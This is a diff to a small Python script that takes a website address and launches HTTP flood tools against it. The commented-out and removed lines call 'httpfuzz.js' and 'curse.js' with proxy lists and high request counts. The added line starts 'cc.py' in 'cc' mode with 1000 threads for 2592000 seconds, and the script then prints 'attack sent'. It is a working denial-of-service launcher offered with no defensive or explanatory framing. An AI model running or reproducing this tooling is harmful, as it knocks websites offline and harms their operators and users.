@@ -8,6 +8,6 @@ if len(sys.argv) < 2:
 website = sys.argv[1]
 print (website)
 #subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stder>
-subprocess.Popen(["timeout","120s" "node", "curse.js", "POST" , website , "300", "1000"], stdout=subprocess.PIP>
+process = subprocess.Popen(["python3", "cc.py", "-url", website, "-m", "cc", "-v", "http", "-t", "1000", "-f", "http.txt", "-b", "1", "-s", "2592000", "post"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print("attack sent")
 
